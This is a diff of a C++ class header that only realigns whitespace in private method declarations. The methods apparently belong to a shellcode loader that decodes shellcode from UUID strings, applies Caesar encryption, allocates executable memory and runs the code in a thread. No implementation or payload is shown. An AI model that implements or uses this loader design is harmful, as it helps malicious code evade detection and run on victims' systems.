@@ -124,13 +124,13 @@ public:
 	}*/
 
 private:
-	VOID _cleanUpResources(HANDLE hThread, PVOID shellcode_exec);
-	PVOID _allocateExecutableMemory(SIZE_T size);
-	CreateThreadFunc _getCreateThreadFunction(void);
-	HANDLE _createShellcodeThread(PVOID shellcode_exec, DWORD& threadID);
-	std::vector<unsigned char> _uuidListToShellcode(const std::vector<std::string>& uuidList);
-	VOID _caesarDecrypt(std::vector<unsigned char>& data, unsigned char key);
-	VOID _caesarEncrypt(std::vector<unsigned char>& data, unsigned char key);
-	std::vector<unsigned char> _hexStringToBytes(const std::string& hex);
+	VOID						_cleanUpResources(HANDLE hThread, PVOID shellcode_exec);
+	PVOID						_allocateExecutableMemory(SIZE_T size);
+	CreateThreadFunc			_getCreateThreadFunction(void);
+	HANDLE						_createShellcodeThread(PVOID shellcode_exec, DWORD& threadID);
+	std::vector<unsigned char>	_uuidListToShellcode(const std::vector<std::string>& uuidList);
+	VOID						_caesarDecrypt(std::vector<unsigned char>& data, unsigned char key);
+	VOID						_caesarEncrypt(std::vector<unsigned char>& data, unsigned char key);
+	std::vector<unsigned char>	_hexStringToBytes(const std::string& hex);
 
 };
